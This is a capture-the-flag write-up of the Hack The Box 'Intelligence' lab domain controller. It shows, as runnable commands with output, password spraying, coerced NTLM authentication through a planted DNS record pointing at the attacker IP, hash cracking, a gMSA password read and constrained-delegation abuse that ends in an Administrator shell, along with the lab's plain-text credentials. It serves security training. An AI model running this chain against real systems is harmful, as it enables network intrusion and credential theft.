# HTB: Intelligence — Writeup

**Target IP:** 10.129.95.154
**Attacker (Kali) IP:** 10.10.15.146

---

## 1. Reconnaissance

### 1.1 Port Scanning (RustScan)

```
┌──(root㉿kali)-[/home/kali/intelligence]
└─# rustscan -a 10.129.95.154
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
With RustScan, I scan ports so fast, even my firewall gets whiplash 💨

Open 10.129.95.154:53
Open 10.129.95.154:80
Open 10.129.95.154:88
Open 10.129.95.154:135
Open 10.129.95.154:139
Open 10.129.95.154:389
Open 10.129.95.154:445
Open 10.129.95.154:464
Open 10.129.95.154:593
Open 10.129.95.154:636
Open 10.129.95.154:3269
Open 10.129.95.154:3268
Open 10.129.95.154:9389
Open 10.129.95.154:49667
Open 10.129.95.154:49691
Open 10.129.95.154:49692
Open 10.129.95.154:49711
Open 10.129.95.154:49717
Open 10.129.95.154:49744
```

### 1.2 Service/Version Scan (Nmap)

```
┌──(root㉿kali)-[/home/kali/intelligence]
└─# nmap -sCV -T4 -p 53,80,88,135,139,389,445,464,593,636,3269,3268,9389,49667,49691,49692,49711,49717,49744 -oA nmap/nmap 10.129.95.154
Nmap scan report for 10.129.95.154
Host is up (0.75s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-03 13:05:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
49744/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h20m10s
```

Standard Domain Controller footprint. Domain **intelligence.htb**, host **DC**. Also confirmed IIS is serving a site on port 80 titled **"Intelligence"**. *(The clock skew is corrected locally with `ntpdate` before any Kerberos-dependent tooling is used, to avoid auth failures from clock drift.)*

---

## 2. Web Enumeration — Harvesting PDFs

### 2.1 Directory Discovery

```
┌──(root㉿kali)-[/home/kali/intelligence]
└─# ffuf -u http://intelligence.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -e .php,.html,.cgi,.php5 -mc 200,301,302,303,403 -fs 7432

documents               [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 308ms]
```

Viewing the page source at `/documents` revealed announcement links pointing to dated report PDFs, e.g.:
```
<a href="documents/2020-12-15-upload.pdf" class="badge badge-secondary">
<a href="documents/2020-01-01-upload.pdf" class="badge badge-secondary">
```

The naming pattern (`YYYY-MM-DD-upload.pdf`) suggested many more dated reports might exist beyond the two linked from the homepage.

### 2.2 Brute-Forcing the Date Pattern

```
┌──(root㉿kali)-[/home/kali/intelligence]
└─# ffuf -u "http://intelligence.htb/documents/FUZZ-upload.pdf" -w <(for year in {2020..2021}; do for month in {01..12}; do for day in {01..31}; do echo "$year-$month-$day"; done; done; done)

2020-01-22              [Status: 200, Size: 28637, ...]
2020-01-23              [Status: 200, Size: 11557, ...]
.....
<snip — ~99 total valid dates matched between Jan 2020 and Mar 2021, each returning a
distinct PDF; the full date list was captured for the download step below>
.....
2021-02-13              [Status: 200, Size: 27053, ...]
```

**99 distinct PDF reports** discovered this way.

### 2.3 Bulk Download

```
┌──(root㉿kali)-[/home/kali/intelligence/pdf]
└─# for date in 2020-01-22 2020-01-23 2020-01-20 ... 2021-02-13; do
    wget -q "http://intelligence.htb/documents/$date-upload.pdf" -O "${date}.pdf"
done
```

All 99 PDFs downloaded locally for offline analysis.

---

## 3. Metadata & Content Mining — Building a Username List and Finding Default Creds

### 3.1 Extracting Usernames from PDF Metadata (exiftool)

```
┌──(root㉿kali)-[/home/kali/intelligence/pdf]
└─# exiftool 2020-09-13.pdf
Creator                         : Jason.Wright
```

Each PDF's `Creator` field held the AD-style username of the employee who generated it — a reliable way to harvest real usernames.

```
┌──(root㉿kali)-[/home/kali/intelligence/pdf]
└─# exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userlist
   99 image files read

┌──(root㉿kali)-[/home/kali/intelligence/pdf]
└─# cat userlist
Anita.Roberts
Brian.Baker
.....
<snip — full alphabetical list of 30 harvested usernames (Brian.Morris, Daniel.Shelton,
Danny.Matthews, Darryl.Harris, David.Mcbride/Reed/Wilson, Ian.Duncan, Jason.Patterson/Wright,
Jennifer.Thomas, Jessica.Moody, John.Coleman, Jose.Williams, Kaitlyn.Zimmerman, Kelly.Long,
Nicole.Brock, Richard.Williams, Samuel.Richardson, Scott.Scott, Stephanie.Young,
Teresa.Williamson, Thomas.Hall/Valenzuela, Travis.Evans, Veronica.Patel, William.Lee) plus
one bogus "Creator" entry from a PDF with unpopulated metadata>
.....
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```

### 3.2 Finding the Genuine Report Among the Filler Content

Converted every PDF to text and skimmed the first line of each to separate real content from filler:

```
┌──(root㉿kali)-[/home/kali/intelligence/pdf]
└─# for f in *pdf; do pdftotext $f; done
┌──(root㉿kali)-[/home/kali/intelligence/pdf]
└─# head -n1 *txt
==> 2020-01-01.txt <==
Dolore ut etincidunt adipisci aliquam labore.
.....
<snip — the overwhelming majority of the 99 reports (~96 of them) are auto-generated
lorem-ipsum filler text, evidently placeholder "reports" with no real content>
.....
==> 2020-06-04.txt <==
New Account Guide

==> 2020-12-30.txt <==
Internal IT Update
```

Two files stood out by title: **`2020-06-04.txt`** ("New Account Guide") and **`2020-12-30.txt`** ("Internal IT Update"). The former was the payoff:

```
┌──(root㉿kali)-[/home/kali/intelligence/pdf]
└─# cat 2020-06-04.txt
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

**Default password disclosed: `NewIntelligenceCorpUser9876`**

---

## 4. Credential Spray → Foothold as Tiffany.Molina → user.txt

### 4.1 Password Spray Across the Harvested Usernames

```
┌──(root㉿kali)-[/home/kali/intelligence/pdf]
└─# nxc smb 10.129.95.154 -u userlist -p NewIntelligenceCorpUser9876 --continue-on-success
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
.....
<snip — 28 more STATUS_LOGON_FAILURE attempts against the rest of the userlist; the account
below never rotated its default password>
.....
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
```

**Working: `Tiffany.Molina` / `NewIntelligenceCorpUser9876`** — the only account still using the disclosed default password.

### 4.2 Share Enumeration

```
┌──(root㉿kali)-[/home/kali/intelligence/pdf]
└─# nxc smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ            
```

Two non-default shares stand out: **`IT`** and **`Users`**.

### 4.3 user.txt via the Users Share

```
┌──(root㉿kali)-[/home/kali/intelligence]
└─# smbclient //10.129.95.154/Users -U Tiffany.Molina
smb: \> cd Tiffany.Molina
smb: \Tiffany.Molina\> cd Desktop
smb: \Tiffany.Molina\Desktop\> ls
  user.txt                           AR       34  Mon Aug  3 12:58:46 2026
```

**User flag obtained** directly over SMB — no shell needed yet.

*(WinRM was also tried with the same credential but failed — `Tiffany.Molina` isn't in Remote Management Users, so SMB/LDAP-based enumeration was the way forward.)*

### 4.4 BloodHound — No Immediately Useful Edges

```
┌──(root㉿kali)-[/home/kali/intelligence]
└─# bloodhound-python -d intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' -ns 10.129.95.154 -c all --zip --dns-timeout 30 --dns-tcp
INFO: Found 43 users
INFO: Found 55 groups
.....
<snip — DCE/RPC connection warnings/timeouts while enumerating the single domain computer,
which didn't affect the completed LDAP-based collection>
.....
INFO: Done in 00M 49S
```

Reviewing the collected graph as **Tiffany.Molina** didn't surface any directly abusable ACL edges — a dead end for this account, prompting a return to the **`IT`** share.

---

## 5. Abusing a Scheduled Script — WebClient DNS Trick → Coerced NTLM Auth

### 5.1 The IT Share's Script

```
┌──(root㉿kali)-[/home/kali/intelligence/pdf]
└─# smbclient //10.129.95.154/IT -U Tiffany.Molina
smb: \> ls
  downdetector.ps1                    A     1046  Mon Apr 19 00:50:55 2021
smb: \> get downdetector.ps1
```

```
┌──(root㉿kali)-[/home/kali/intelligence]
└─# cat downdetector.ps1
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if($request.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

This script runs **every 5 minutes** (presumably as a scheduled task under **Ted.Graves**' context, based on the mail sender). It enumerates every DNS record in the domain zone whose name starts with `web`, and for each one, sends an HTTP request **using the current Windows credentials** (`-UseDefaultCredentials`, i.e. authenticated NTLM/Kerberos). Any authenticated user with DNS-record-creation rights can add a new `web*` record pointing at an attacker-controlled host, and this script will unknowingly authenticate to it.

### 5.2 Adding a Malicious DNS Record

Used **`dnstool.py`** (from Dirk-jan's `krbrelayx` toolkit) with Tiffany's credentials — authenticated, non-admin users can add DNS records in this environment by default:

```
┌──(root㉿kali)-[/home/kali/intelligence/krbrelayx]
└─# python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 10.129.95.154 -a add --record web-test --data 10.10.15.146 --type A
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

A new **A record** `web-test` → `10.10.15.146` (Kali) was registered in the domain DNS zone.

### 5.3 Capturing the Coerced Authentication (Responder)

```
┌──(root㉿kali)-[/home/kali/intelligence]
└─# responder -I tun0
[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:a4ca0fb52ccf08d6:8198A5B668FEFE8CF69560BA0A36EC5D:0101000000000000...
```

After waiting for the scheduled task's next 5-minute run, `downdetector.ps1` resolved the new `web-test` record, sent an authenticated HTTP request to it, and **Responder captured the NetNTLMv2 hash for `Ted.Graves`** — confirming the script does indeed run as that user.

### 5.4 Cracking the Hash (John)

```
┌──(root㉿kali)-[/home/kali/intelligence/krbrelayx]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Mr.Teddy         (Ted.Graves)     
1g 0:00:00:10 DONE (2026-08-03 11:24) 0.09407g/s 1017Kp/s
```

**Cracked: `Ted.Graves` / `Mr.Teddy`**

---

## 6. Privilege Escalation — gMSA Password Read → Constrained Delegation Abuse → root.txt

### 6.1 ReadGMSAPassword on svc_int$

`Ted.Graves` is a member of the domain's **IT** group, which holds **`ReadGMSAPassword`** rights over the group-managed service account **`SVC_INT$`**. This lets any member read that gMSA's current, rotating password directly from AD:

```
┌──(root㉿kali)-[/home/kali/intelligence/krbrelayx]
└─# bloodyad --host "10.129.95.154" -d "intelligence.htb" -u "Ted.Graves" -p "Mr.Teddy" get object SVC_INT$ --attr msDS-ManagedPassword

distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
msDS-ManagedPassword.NT: 320520da1af1dc49e5bae1514f61f944
msDS-ManagedPassword.B64ENCODED: 679nhmbkwpUn4Q1zKznDAobFWjsEcPCBSQzH8+uUdmGdfp3sem7GbXpbWnRKA+e8Npt...
```

**Recovered: `SVC_INT$` NTLM hash `320520da1af1dc49e5bae1514f61f944`**

### 6.2 Constrained Delegation on SVC_INT$

Checking `SVC_INT$`'s attributes further showed it's configured for **constrained delegation** (`msDS-AllowedToDelegateTo`) to the SPN **`WWW/dc.intelligence.htb`** — meaning `SVC_INT$` is trusted to obtain service tickets to that specific service *on behalf of* any other user, via the Kerberos S4U2Self/S4U2Proxy extensions.

### 6.3 Requesting an Impersonated Service Ticket (S4U2Self / S4U2Proxy)

```
┌──(root㉿kali)-[/home/kali/intelligence/krbrelayx]
└─# getST.py -dc-ip 10.129.95.154 -spn www/dc.intelligence.htb -hashes :320520da1af1dc49e5bae1514f61f944 -impersonate administrator intelligence.htb/svc_int
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

Using `SVC_INT$`'s hash, requested a service ticket for `www/dc.intelligence.htb` while **impersonating `administrator`** — the constrained delegation trust lets this succeed even though we never authenticated as the real Administrator.

### 6.4 Using the Ticket — Administrator Code Execution

```
┌──(root㉿kali)-[/home/kali/intelligence/krbrelayx]
└─# KRB5CCNAME=administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\>whoami
intelligence\administrator

C:\>cd C:\users\administrator\desktop
C:\users\administrator\desktop>type root.txt
```

**Root/Domain Admin obtained** via WMI exec using the delegated Kerberos ticket. `root.txt` confirmed present on the Administrator's desktop.

---

## 7. Summary / Attack Chain

1. **Recon**: Nmap → standard AD Domain Controller footprint (domain **intelligence.htb**, host **DC**), plus an IIS site on port 80.
2. **Web enum**: Found a `/documents` directory serving dated report PDFs (`YYYY-MM-DD-upload.pdf`); brute-forced the date pattern to pull down 99 total reports.
3. **Metadata mining**: Extracted the `Creator` field from every PDF via exiftool to build a 30-user AD username list.
4. **Content mining**: Converted all PDFs to text; nearly all were lorem-ipsum filler, but one — "New Account Guide" — disclosed a **default onboarding password** (`NewIntelligenceCorpUser9876`).
5. **Credential spray**: Sprayed the default password across the harvested usernames → only **`Tiffany.Molina`** hadn't changed it.
6. **user.txt**: Read directly from the `Users` SMB share as Tiffany, no shell required. BloodHound as Tiffany revealed no usable ACL edges.
7. **Coerced authentication**: Found `downdetector.ps1` on the `IT` share — a scheduled task (running as **Ted.Graves**) that authenticates to any DNS record starting with `web`. Registered a malicious `web-test` A record pointing at Kali using `dnstool.py`, then captured Ted.Graves' NetNTLMv2 hash with **Responder** when the task ran.
8. **Cracking**: John cracked the hash → `Ted.Graves:Mr.Teddy`.
9. **gMSA abuse**: Ted.Graves' membership in the **IT** group granted `ReadGMSAPassword` over the gMSA **`SVC_INT$`** — read its current NTLM hash directly from AD via **bloodyAD**.
10. **Constrained delegation abuse**: `SVC_INT$` was configured for constrained delegation to `WWW/dc.intelligence.htb`. Used **`getST.py`** (S4U2Self/S4U2Proxy) with the gMSA's hash to obtain a service ticket **impersonating Administrator**.
11. **Domain Admin**: Used the ticket with **`wmiexec.py`** for command execution as `intelligence\administrator` → `root.txt`.

### Key Vulnerabilities Chained
- Sensitive default credentials disclosed in a publicly accessible document, and never rotated by at least one real account
- Overly permissive SMB share (`Users`) allowing direct flag retrieval and cross-user directory browsing
- An internal automation script (`downdetector.ps1`) that blindly authenticates (`-UseDefaultCredentials`) to any DNS-registered hostname matching a pattern, combined with unprivileged users being able to create new DNS records — a coercion primitive for capturing NTLM hashes of the account running the task
- Overly broad `ReadGMSAPassword` rights granted to a wide IT group, exposing a gMSA's live credential material
- Constrained delegation configured on that gMSA toward a DC-hosted SPN, allowing full impersonation of Administrator via S4U2Self/S4U2Proxy
